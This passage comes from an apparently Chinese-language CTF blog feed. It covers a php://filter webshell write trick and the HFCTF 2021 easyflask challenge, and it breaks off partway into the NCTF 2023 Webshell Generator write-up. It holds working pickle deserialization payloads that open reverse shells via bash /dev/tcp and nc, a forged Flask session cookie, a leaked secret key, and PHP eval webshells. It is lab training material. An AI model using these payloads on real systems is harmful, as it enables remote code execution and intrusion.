class="hljs-string">&quot;aaaPD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=&quot;</span></span>;&#125;&#125;<br></code></pre></td></tr></table></figure><h4 id="æ€è·¯æ€»ç»“ï¼š-8"><a href="#æ€è·¯æ€»ç»“ï¼š-8" class="headerlink" title="æ€è·¯æ€»ç»“ï¼š"></a>æ€è·¯æ€»ç»“ï¼š</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">file<span class="hljs-constructor">_put_contents(&#x27;<span class="hljs-params">php</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">filter</span><span class="hljs-operator">/</span><span class="hljs-params">write</span>=<span class="hljs-params">convert</span>.<span class="hljs-params">base64</span>-<span class="hljs-params">decode</span><span class="hljs-operator">/</span><span class="hljs-params">resource</span>=<span class="hljs-params">r</span>.<span class="hljs-params">php</span>&#x27;,&#x27;PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=&#x27;)</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸œè¥¿æ„æ€æ˜¯æŠŠbase64ç¼–ç åçš„æ•°æ®å†™åˆ°<code>r.php</code>ä¸­ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ç§æ–¹æ³•å»ç»•è¿‡ç±»ä¼¼<code>exit(),die()</code>è¿™ç§å‡½æ•°(å› ä¸ºè¢«å½“æˆbase64å†™åˆ°æŒ‡å®šæ–‡ä»¶é‡Œäº†ï¼Œå¤±å»äº†åŸæœ¬çš„æ„ä¹‰)ã€‚</p><p><a href="https://xz.aliyun.com/t/8163?time__1311=n4+xuDgDBDyGKAKD=D7Dl1oQ30I34mwrxiKx&alichlgref=https://www.cnblogs.com/#toc-1">å‚è€ƒæ–‡ç« 2</a></p><p><a href="https://xiaolong22333.top/archives/114/">å‚è€ƒæ–‡ç« 3</a></p><h2 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h2><p>è·Ÿç€æç¤ºåšï¼š</p><p><img src="/img/hfctf2021final1.png" alt="hfctf2021final1"></p><p>å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Ÿè¯•è¯•<code>/etc/passwd</code>:</p><p><img src="/img/hfctf2021final2.png" alt="hfctf2021final2"></p><p><img src="/img/hfctf2021final3.png" alt="hfctf2021final3"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3.6</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, session<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&quot;SECRET_KEY&quot;</span>] = <span class="hljs-string">&quot;*******&quot;</span><br><br><span class="hljs-comment"># å®šä¹‰ User ç±»</span><br>User = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;User&#x27;</span>, (<span class="hljs-built_in">object</span>,), &#123;<br>    <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>,<br>    <span class="hljs-string">&#x27;is_admin&#x27;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-string">&#x27;__repr__&#x27;</span>: <span class="hljs-keyword">lambda</span> o: o.uname,<br>&#125;)<br><br><span class="hljs-comment"># å¤„ç†æ ¹è·¯å¾„</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index_handler</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;u&#x27;</span>):<br>        u = pickle.dumps(User())<br>        session[<span class="hljs-string">&#x27;u&#x27;</span>] = u<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/file?file=index.js&quot;</span><br><br><span class="hljs-comment"># å¤„ç†æ–‡ä»¶è·¯å¾„</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">file_handler</span>():<br>    path = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>    path = os.path.join(<span class="hljs-string">&#x27;static&#x27;</span>, path)<br>    <br>    <span class="hljs-comment"># æ£€æŸ¥è·¯å¾„åˆæ³•æ€§</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path) <span class="hljs-keyword">or</span> os.path.isdir(path) \<br>            <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.py&#x27;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.sh&#x27;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> path:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;disallowed&#x27;</span><br><br>    <span class="hljs-comment"># è¯»å–æ–‡ä»¶å†…å®¹å¹¶è¿”å›</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>        content = fp.read()<br>    <span class="hljs-keyword">return</span> content<br><br><span class="hljs-comment"># å¤„ç†ç®¡ç†å‘˜é¡µé¢</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin_handler</span>():<br>    <span class="hljs-keyword">try</span>:<br>        u = session.get(<span class="hljs-string">&#x27;u&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(u, <span class="hljs-built_in">dict</span>):<br>            u = b64decode(u.get(<span class="hljs-string">&#x27;b&#x27;</span>))<br>            u = pickle.loads(u)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;uhh?&#x27;</span><br><br>    <span class="hljs-comment"># æ£€æŸ¥ç”¨æˆ·æ˜¯å¦ä¸ºç®¡ç†å‘˜</span><br>    <span class="hljs-keyword">if</span> u.is_admin == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;welcome, admin&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;who are you?&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>å…ˆæŠ“åŒ…çœ‹ä¸‹<code>session</code>:ï¼Œpythonçš„è¯ä¼°è®¡æ˜¯<code>JWT</code>:</p><p><img src="/img/hfctf2021final4.png" alt="hfctf2021final4"></p><p><code>b</code>é”®å¯¹åº”çš„<code>base</code>64ï¼Œåœ¨<code>/admin</code>è·¯ç”±ä¸‹ä¼šè¿›è¡Œå¤„ç†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">u = b64decode(u.get(<span class="hljs-string">&#x27;b&#x27;</span>))<br>u = pickle.loads(u)<br></code></pre></td></tr></table></figure><p>åé¢æƒ³ç€æ€ä¹ˆè¯»<code>secret_key</code>ï¼Œä¹‹å‰ç¢°åˆ°è¿‡è¯»<code>/proc/self/environ</code>çš„ï¼Œè¯•è¯•ï¼š</p><p><img src="/img/hfctf2021final6.png" alt="hfctf2021final6"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">secret_key=glzji<span class="hljs-symbol">n22948575858</span>jfjfjufirijidjit<span class="hljs-name">g3</span>uiiuuh<br></code></pre></td></tr></table></figure><p>è¿˜è¯»äº†<code>/proc/1/environ</code>ï¼Œç›´æ¥æ‹¿åˆ°flagäº†ï¼š</p><p><img src="/img/hfctf2021final7.png" alt="hfctf2021final7"></p><p>æ­£å¸¸åšçš„è¯å°±æ˜¯pythonååºåˆ—åŒ–+sessionä¼ªé€ æ‰§è¡Œå‘½ä»¤(è¿™é‡Œç›´æ¥åå¼¹shelläº†ï¼Œæ²¡è¯•èƒ½ä¸èƒ½æ‰§è¡Œlså•¥çš„)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">import</span> os<br>        cmd = <span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/IP/9001 0&gt;&amp;1&#x27;&quot;</span><br>        <span class="hljs-keyword">return</span> (os.system, (cmd,))<br>u = pickle.dumps(User())<br><span class="hljs-built_in">print</span>(b64encode(u))<br></code></pre></td></tr></table></figure><p><code>flask-unsigh</code>ç”¨æ³•ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">flask-unsign <span class="hljs-attr">--unsign</span> <span class="hljs-attr">--decode</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;eyJ1Ijp7IiBiIjoiZ0FTVkdBQUFBQUFBQUFDTUNGOWZiV0ZwYmw5ZmxJd0VWWE5sY3BTVGxDbUJsQzQ9In19.ZbCRbw.VSVb2deVeKAEUTAotx5adFSrhgY&quot;</span> <span class="hljs-attr">--secret</span> <span class="hljs-string">&#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27;</span> <span class="hljs-attr">--no-literal-eval</span><br><br>flask-unsign <span class="hljs-attr">--sign</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVTwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDRiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzQzLjEyOC43LjExNy85MDAxIDA+JjEnlIWUUpQu&#x27;&#125;&#125;&quot;</span> <span class="hljs-attr">--secret</span> <span class="hljs-string">&#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27;</span> <span class="hljs-attr">--no-literal-eval</span><br></code></pre></td></tr></table></figure><p>åé¢çœ‹äº†ä¸‹ï¼Œè¿˜æœ‰å…¶å®ƒå†™æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><br>User = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;User&#x27;</span>, (<span class="hljs-built_in">object</span>,), &#123;<br>    <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>,<br>    <span class="hljs-string">&#x27;is_admin&#x27;</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-string">&#x27;__repr__&#x27;</span>: <span class="hljs-keyword">lambda</span> o: o.uname,<br>    <span class="hljs-string">&#x27;__reduce__&#x27;</span>: <span class="hljs-keyword">lambda</span> o: (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc IP PORT -e /bin/sh&#x27;)&quot;</span>,))<br><br>&#125;)<br><br>u = pickle.dumps(User())<br><span class="hljs-built_in">print</span>(b64encode(u).decode())<br><span class="hljs-comment">#æˆ–è€…ï¼š</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">import</span> os<br>        cmd = <span class="hljs-string">&quot;cat /flag &gt; /tmp/test1&quot;</span><br>        <span class="hljs-keyword">return</span> (os.system, (cmd,))<br></code></pre></td></tr></table></figure><h4 id="æ€è·¯æ€»ç»“ï¼š-9"><a href="#æ€è·¯æ€»ç»“ï¼š-9" class="headerlink" title="æ€è·¯æ€»ç»“ï¼š"></a>æ€è·¯æ€»ç»“ï¼š</h4><p>ç®€å•<code>python</code>ååºåˆ—åŒ–å’Œ<code>session</code>ç»“åˆï¼Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œ<code>/proc</code>ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>åšé¢˜è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023_NCTF_Webéƒ¨åˆ†é¢˜ç›®å¤ç°</title>
    <link href="/2023/12/31/2023NCTF_web%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/12/31/2023NCTF_web%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>èŠœæ¹–ï¼Œçˆ†é›¶äº† :) </p><span id="more"></span><hr><h3 id="Webshell-Generator"><a href="#Webshell-Generator" class="headerlink" title="Webshell Generator"></a>Webshell Generator</h3><blockquote><p> é¢˜ç›®æè¿°ï¼šç”Ÿæˆä½ çš„ä¸“å±Webshellï¼</p></blockquote><p>ä¸€å¥è¯æœ¨é©¬ç”Ÿæˆå™¨ï¼Œå¯ä»¥æ§åˆ¶è¯·æ±‚æ–¹æ³•ã€å¯†é’¥å’Œæ–‡ä»¶åç§°ï¼Œç‚¹äº†ç”Ÿæˆä¼šè‡ªåŠ¨ä¸‹è½½ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ï¼š</p><p><img src="/img/2023nctfwebshell2.png" alt="2023nctfwebshell2"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//webshell.php</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;114&quot;</span>]);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¾ˆå®¹æ˜“æƒ³åˆ°ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼ŒæŠ“ä¸ªåŒ…ï¼š</p><p><img src="/img/2023nctfwebshell5.png" alt="2023nctfwebshell5"></p><p><code>POST</code>ä¹‹åä¼šé‡å®šå‘åˆ°<code>download.php</code>é¡µé¢ä¸‹è½½æ–‡ä»¶ï¼Œ<code>URL</code>æ ¼å¼ï¼š<code>download.php?file=/tmp/i4ar6mxnweaozfl9&amp;filename=webshell.php</code>ã€‚é€šè¿‡ä¿®æ”¹<code>file</code>å°è¯•ä¸‹è½½<code>download.php</code>å’Œ<code>index.php</code></p><p><img src="/img/2023nctfwebshell6.png" alt="2023nctfwebshell6"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">security_validate</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\r|\n/&#x27;</span>, <span class="hljs-variable">$value</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$key</span> ä¸èƒ½åŒ…å«æ¢è¡Œç¬¦ï¼&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$value</span>) &gt; <span class="hljs-number">114</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$key</span> ä¸èƒ½è¶…è¿‡114ä¸ªå­—ç¬¦ï¼&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">security_validate</span>();<br><span class="hljs-keyword">if</span> (@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;method&#x27;</span>] &amp;&amp; @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] &amp;&amp; @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;language&#x27;</span>] !== <span class="hljs-string">&#x27;PHP&#x27;</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;PHPæ˜¯æœ€å¥½çš„è¯­è¨€&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$method</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;method&#x27;</span>];<br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;METHOD=<span class="hljs-subst">$method</span>&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä½ çš„methodå¤ªå¤æ‚äº†ï¼&quot;</span>);<br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;KEY=<span class="hljs-subst">$key</span>&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä½ çš„keyå¤ªå¤æ‚äº†ï¼&quot;</span>);<br>    <span class="hljs-variable">$status_code</span> = -<span class="hljs-number">1</span>;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;sh generate.sh&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$filename</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ç”Ÿæˆå¤±è´¥äº†ï¼&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: download.php?file=<span class="hljs-subst">$filename</span>&amp;filename=<span class="hljs-subst">&#123;$_POST[&#x27;filename&#x27;]&#125;</span>&quot;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;html&gt;<br><br>&lt;head&gt;<br>    &lt;title&gt;Webshellç”Ÿæˆå™¨&lt;/title&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>    &lt;style&gt;<br>        body &#123;<br>            background-color: <span class="hljs-comment">#f2f2f2;</span><br>            font-family: Arial, sans-serif;<br>        &#125;<br><br>        form &#123;<br>            margin: <span class="hljs-number">50</span>px auto;<br>            width: <span class="hljs-number">400</span>px;<br>            background-color: <span class="hljs-comment">#fff;</span><br>            padding: <span class="hljs-number">20</span>px;<br>            border-radius: <span class="hljs-number">10</span>px;<br>            box-shadow: <span class="hljs-number">0</span>px <span class="hljs-number">0</span>px <span class="hljs-number">10</span>px <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.2</span>);<br>        &#125;<br><br>        h1 &#123;<br>            text-align: center;<br>            color: <span class="hljs-comment">#333;</span><br>        &#125;<br><br>        label &#123;<br>            display: block;<br>            margin-bottom: <span class="hljs-number">10</span>px;<br>            color: <span class="hljs-comment">#666;</span><br>        &#125;<br><br>        input[type=<span class="hljs-string">&quot;text&quot;</span>],<br>        select &#123;<br>            width: <span class="hljs-number">100</span>%;<br>            padding: <span class="hljs-number">10</span>px;<br>            border-radius: <span class="hljs-number">5</span>px;<br>            border: none;<br>            margin-bottom: <span class="hljs-number">20</span>px;<br>            box-sizing: border-box;<br>        &#125;<br><br>        input[type=<span class="hljs-string">&quot;submit&quot;</span>] &#123;<br>            background-color: <span class="hljs-comment">#4CAF50;</span><br>            color: <span class="hljs-comment">#fff;</span><br>            border: none;<br>            padding: <span class="hljs-number">10</span>px <span class="hljs-number">20</span>px;<br>            border-radius: <span class="hljs-number">5</span>px;<br>            cursor: pointer;<br>        &#125;<br><br>        input[type=<span class="hljs-string">&quot;submit&quot;</span>]:hover &#123;<br>            background-color: <span class="hljs-comment">#3e8e41;</span><br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br><br>&lt;body&gt;<br>    &lt;form action=<span class="hljs-string">&quot;index.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>        &lt;h1&gt;Webshellç”Ÿæˆå™¨&lt;/h1&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;language&quot;</span>&gt;Webshellè¯­è¨€ï¼š&lt;/label&gt;<br>        &lt;select name=<span class="hljs-string">&quot;language&quot;</span> id=<span class="hljs-string">&quot;method&quot;</span>&gt;<br>            &lt;option value=<span class="hljs-string">&quot;PHP&quot;</span>&gt;PHP&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;PHP&quot;</span>&gt;PHP&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;PHP&quot;</span>&gt;PHP&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;PHP&quot;</span>&gt;PHP&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;PHP&quot;</span>&gt;PHP&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;PHP&quot;</span>&gt;PHP&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;PHP&quot;</span>&gt;PHP&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;PHP&quot;</span>&gt;PHP&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;PHP&quot;</span>&gt;PHP&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;PHP&quot;</span>&gt;PHP&lt;/option&gt;<br>        &lt;/select&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;method&quot;</span>&gt;è¯·æ±‚æ–¹æ³•ï¼š&lt;/label&gt;<br>        &lt;select name=<span class="hljs-string">&quot;method&quot;</span> id=<span class="hljs-string">&quot;method&quot;</span>&gt;<br>            &lt;option value=<span class="hljs-string">&quot;POST&quot;</span>&gt;POST&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;GET&quot;</span>&gt;GET&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;REQUEST&quot;</span>&gt;REQUEST&lt;/option&gt;<br>        &lt;/select&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;key&quot;</span>&gt;å¯†é’¥ï¼š&lt;/label&gt;<br>        &lt;input name=<span class="hljs-string">&quot;key&quot;</span> type=<span class="hljs-string">&quot;text&quot;</span> value=<span class="hljs-string">&quot;114&quot;</span> pattern=<span class="hljs-string">&quot;[A-Za-z0-9]+&quot;</span> title=<span class="hljs-string">&quot;ä½ çš„keyå¤ªå¤æ‚äº†ï¼ç®€å•ç‚¹ï¼o.O&quot;</span>&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;filename&quot;</span>&gt;Webshellæ–‡ä»¶åç§°ï¼š&lt;/label&gt;<br>        &lt;input name=<span class="hljs-string">&quot;filename&quot;</span> type=<span 